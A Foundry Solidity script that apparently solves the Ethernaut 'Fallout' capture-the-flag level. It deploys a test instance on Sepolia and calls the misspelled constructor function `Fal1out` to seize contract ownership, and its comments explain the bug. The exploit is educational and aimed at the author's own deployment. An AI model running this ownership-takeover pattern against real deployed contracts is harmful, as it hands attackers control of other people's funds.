// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Fallout} from "../src/Fallout.sol";

// Our Instance address: https://sepolia.etherscan.io/address/0x6a728b4137ac53943fec64e0064c5582f637313e

contract FallbackSolution is Script {
    // $ source .env      # This is to store the environmental variables in the shell session
    // $ forge script script/Fallout.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

    function run() external {
        // Deploy Fallout contract (It is better to deploy your instance for the contract to avoid errors)
        Fallout falloutInstance = _deployFalloutContract();
        // We will simulate the attack by the second address in the .env file
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY_2");
        vm.startBroadcast(attackerPrivateKey);

        // - The constuctor in solidity v6 should has the name of teh contract like java
        // - The issue here is that the contract name is `Fallout` and the constructor wrongly wrote as `Fal1out`
        // - since `Fal1out` is a normal function, anyone can be the owner of the contract by firing the function
        console.log("Owner:", falloutInstance.owner());
        falloutInstance.Fal1out();
        console.log("New Owner:", falloutInstance.owner());

        vm.stopBroadcast();
    }

    function _deployFalloutContract() internal returns (Fallout) {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Fallout falloutInstance = new Fallout();
        console.log("Fallout address:", address(falloutInstance));
        vm.stopBroadcast();
        return falloutInstance;
    }
}
